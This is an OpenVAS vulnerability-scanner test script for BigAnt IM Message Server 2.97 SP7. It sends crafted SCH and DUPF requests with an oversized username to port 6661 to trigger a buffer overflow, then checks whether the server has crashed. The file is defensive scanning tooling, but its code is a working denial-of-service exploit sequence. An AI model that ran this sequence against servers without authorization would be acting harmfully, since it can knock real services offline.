###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bigant_im_msg_server_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# BigAntSoft BigAnt IM Message Server Multiple Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to execute arbitrary code or
  can upload arbitrary files or manipulate SQL queries by injecting arbitrary
  SQL queries.
  Impact Level: System/Application";

tag_affected = "BigAnt Server version 2.97 SP7, Other versions may also be affected";
tag_insight = "Multiple flaws are due to,
  - Improper validation of user input when handling the filename header
    in SCH requests or when handling the userid component in DUPF requests.
  - Not properly verify or sanitize user-uploaded files.
  - Not properly sanitizing user-supplied input to the 'Account/Full Name'
    field when performing an Account/Full Name user search.";
tag_solution = "No solution or patch is available as of 29th January, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.bigantsoft.com/im/server.html";
tag_summary = "The host is running BigAntSoft BigAnt IM Message Server and
  is prone to multiple vulnerabilities.";

if(description)
{
  script_id(802051);
  script_version("$Revision: 11 $");
  script_bugtraq_id(57214);
  script_cve_id("CVE-2012-6273", "CVE-2012-6274", "CVE-2012-6275");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-04 11:45:47 +0530 (Mon, 04 Mar 2013)");
  script_name("BigAntSoft BigAnt IM Message Server Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/89342");
  script_xref(name : "URL" , value : "http://osvdb.org/89343");
  script_xref(name : "URL" , value : "http://osvdb.org/89344");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/990652");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/117864");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120404");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120405");

  script_description(desc);
  script_summary("Check if BigAnt IM Server is vulnerable to BoF");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports(6661);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

## Check port state
port = 6661;
if(!get_port_state(port)) exit(0);

## Open socket
soc = open_sock_tcp(port);
if(!soc) exit(0);

## Common SCH request
common_req = string ("SCH 16", '\x0a',
                     "cmdid: 1", '\x0a',
                     "content-length: 0", '\x0a',
                     "content-type: Appliction/Download", '\x0a',
                     "filename: Uujj.txt", '\x0a',
                     "modified: 1248-21-32 08:13:01", '\x0a',
                     "pclassid: 102", '\x0a',
                     "pobjid: 1", '\x0a',
                     "rootid: 1", '\x0a',
                     "sendcheck: 1", '\x0a',
                     "source_cmdname: DUPF", '\x0a',
                     "source_content-length: 116619", '\x0a',
                     "userid: 5", '\x0a');
normal_req = string(common_req, "username: bstest", '\x0a','\x0a');

## Send normal request to confirm the application
## with specific response
send(socket:soc, data:normal_req);
normal_res = recv(socket:soc, length:1024);

## Confirm the application before trying an exploit
if("SCH 1" >!< normal_res || "scmderid:" >!< normal_res){
  close(soc);
  exit(0);
}

## Send crafted SCH request with big username
bof = crap(length:1000, data:"A");
attack_req1 = string(common_req , "username: ", bof, '\x0a','\x0a');
send(socket:soc, data:attack_req1);
attack_res1 = recv(socket:soc, length:1024);

## Extract scmderid from the response
scmderid = eregmatch(pattern:"scmderid: (\{.*\})",string:attack_res1);
if(isnull(scmderid)){
  close(soc);
  exit(0);
}


## Send crafted DUPF request to trigger the BoF
attack_req2 = string("DUPF 16", '\x0a',
                     "cmdid: 1", '\x0a',
                     "content-length: 14", '\x0a',
                     "content-type: Appliction/Download", '\x0a',
                     "filename: Uujj.txt", '\x0a',
                     "modified: 1248-21-32 08:13:01", '\x0a',
                     "pclassid: 102", '\x0a',
                     "pobjid: 1", '\x0a',
                     "rootid: 1", '\x0a',
                     "scmderid: ", scmderid[1], '\x0a',
                     "sendcheck: 1", '\x0a',
                     "userid: 5", '\x0a',
                     "username: xmcjm", '\x0a', '\x0a',
                     "KiLTTSQlSwtmiY");

send(socket:soc, data:attack_req2);
attack_res2 = recv(socket:soc, length:1024);

## Close socket
close(soc);

sleep(2);

## Confirm exploit worked or not
soc2 = open_sock_tcp(port);
if(!soc2){
  security_hole(port);
  exit(0);
}

## Close socket
close(soc2);
